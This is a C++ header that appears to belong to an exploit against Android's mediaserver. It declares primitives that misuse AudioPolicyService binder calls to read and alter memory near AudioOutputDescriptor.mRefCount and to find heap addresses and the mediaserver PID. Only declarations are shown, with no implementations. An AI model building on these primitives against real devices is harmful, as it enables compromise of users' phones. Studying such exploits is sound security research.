#ifndef __PRIMITIVES_H__
#define __PRIMITIVES_H__

#include <binder/IPCThreadState.h>
#include <binder/IServiceManager.h>

#include <media/AudioSystem.h>
#include <media/IAudioFlinger.h>
#include <media/IAudioPolicyService.h>

//The default output descriptor number
#define DEFAULT_OUTPUT (2)

//The granularity in which the progress is outputted to the standard output when called modify_value
#define MODIFY_VALUE_PRINT_STEP (10000)

namespace android {

/**
 * Attempts to read the higher bits of a word at the given offset.
 * @param service The handle to the AudioPolicyService, using which the binder command is sent.
 * @param offset The offset from the AudioOutputDescriptor.mStopTimes field, in QWORDs.
 * @param value The read value at the given address.
 * @return Zero if successful, EFAULT if the data at the given offset couldn't be read.
 * @note The value cannot be read if the DWORD at AudioOutputDecriptor.mRefCount[offset] is not zero.
 */
int probable_read32(const sp<IAudioPolicyService>& service, int offset, uint32_t& value);

/**
 * Checks whether or not the DWORD at the given offset from AudioOutputDescriptor.mRefCount
 * is a zero or not.
 * @param service The handle to the AudioPolicyService, using which the binder command is sent.
 * @param offset The offset from the AudioOutputDescriptor.mRefCount field, in DWORDs.
 * @return 1 if the DWORD is not zero, and 0 otherwise.
 */
int is_non_zero(const sp<IAudioPolicyService>& service, int offset);

/**
 * Increments the DWORD at the given offset by one.
 * @param service The handle to the AudioPolicyService, using which the binder command is sent.
 * @param offset The offset from the AudioOutputDescriptor.mRefCount, in DWORDs.
 * @NOTE: Do *NOT* use this method to increment a zero value to one. This will cause a complicated
 * corner-case in startOutput, which will most definitely crash.
 */
void increment_by_one(const sp<IAudioPolicyService>& service, int offset);

/**
 * Decrements the DWORD at the given offset by one.
 * @param service The handle to the AudioPolicyService, using which the binder command is sent.
 * @param offset The offset from the AudioOutputDescriptor.mRefCount, in DWORDs.
 * @NOTE: Do *NOT* use this method to decrement a value to zero. This will cause a complicated
 * corner-case in stopOutput, which will most definitely crash.
 */

void decrement_by_one(const sp<IAudioPolicyService>& service, int offset);

/**
 * Modifies the value at the given offset, from the given value to the new value.
 * @param service The handle to the AudioPolicyService, using which the binder command is sent.
 * @param offset The offset from the AudioOutputDescriptor.mRefCount field, in DWORDs.
 * @param difference The difference between the current value and the new wanted value.
 */
void modify_value(const sp<IAudioPolicyService>& service, int offset, int difference);

/**
 * Returns the address of the AudioPolicyManagerBase object in mediaserver's heap.
 * @return The remote address of APMB.
 */
uint32_t get_audio_policy_manager_base_address();

/**
 * Reads the negative (high) value at the given offset.
 * NOTE: This also destroys the given value! Use with caution...
 * @param service The handle to the AudioPolicyService, using which the binder command is sent.
 * @param offset The offset from AudioOutputDescriptor.mRefCount at which the value is retrieved.
 * @return The value read at the given offset.
 */
int read_negative_value_at(const sp<IAudioPolicyService>& service, int offset);

/**
 * Returns the PID of the currently executing mediaserver process.
 * @return the PID of the currently executing mediaserver process.
 */
pid_t get_mediaserver_pid();

}

#endif
